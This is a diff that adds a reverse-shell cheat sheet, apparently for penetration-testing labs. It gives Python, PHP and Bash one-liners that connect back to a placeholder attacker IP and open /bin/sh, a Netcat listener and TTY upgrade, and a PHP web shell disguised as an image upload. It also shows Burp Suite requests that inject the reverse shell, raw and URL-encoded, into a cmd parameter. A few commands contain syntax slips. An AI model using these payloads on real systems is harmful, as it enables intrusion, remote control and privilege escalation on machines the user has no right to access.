@@ -1,0 +1,64 @@
+
+FIRST, Remeber to set up a Netcat listener in a seperate terminal window before launcing a reverse shell.
+Use which ever port suits your needs. 4444, 445 and 8080 are common ports used for reverse shells.
+
+nc -nlvp 4444
+
+#Remember to put your attack machine's IP address and desired port number in these commands. I am using the IP 192.168.1.1 and port numbers 1234 and 8080 as place holders.
+
+_______________________________________________________________________________________________________________
+The shell commands
+________________________________________________________________________________________________________________
+#Python:
+#This reverse shell command creates a network socket to connect to a shell command on a target machine.
+
+python -c 'import socket, subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.1",1234)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])
+
+
+#PHP:
+
+php -r '$sock=fsockopen("192.168.1.1",1234;exec("/bin/sh -i <&3 2>&3");'
+
+#BASH:
+
+bash -i >& /dev/tcp/192.168.1.1/8080 0>&1
+
+#After obtaining a reverse connection use the following Python command to spawn an interactive TTY Shell.
+#This will allow for greater interactive capabilities, such as using the "su" command, up arrow, tab-complete and job control.
+
+Python -c 'import pty; pty.spawn("bin/bash")'
+
+____________________________________________________________________________________________________________________
+Using the Python reverse shell in Burpsuite for Web App hacking
+___________________________________________________________________________________________________________________
+#The Python revese shell command can be used to create a a reverse connection to a web app too. 
+#First, upload the following PHP shell command to the web app disguised as a .PNG file.
+
+GIF89;
+<?php echo shell_exec($_GET["cmd"]); ?>
+
+#Return to Burpsuite, and send the GET /index.php? packet to the Repeater
+GET /index.php?cmd=hostname HTTP/1.1
+
+#Replace, "hostname" ,with the Python command in the URL Parameter
+
+GET /index.php?cmd=python -c 'import socket, subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.1",1234)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])
+ HTTP/1.1
+
+#Then URL encode the reverse shell command within the URL parameter:
+
+GET /index.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%20%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%31%2e%31%22%2c%31%32%33%34%29%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%20%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29  HTTP/1.1
+
+#Click run
+#If all was set up properly, this will create a reverse connection between Kali Linux and the target Web App using Burpsuite, which you will see in the Netcat listener window.
+#Spawn the interactive TTY shell and escalate privileges.
+
+
+
+
+
+
+
+
+
+
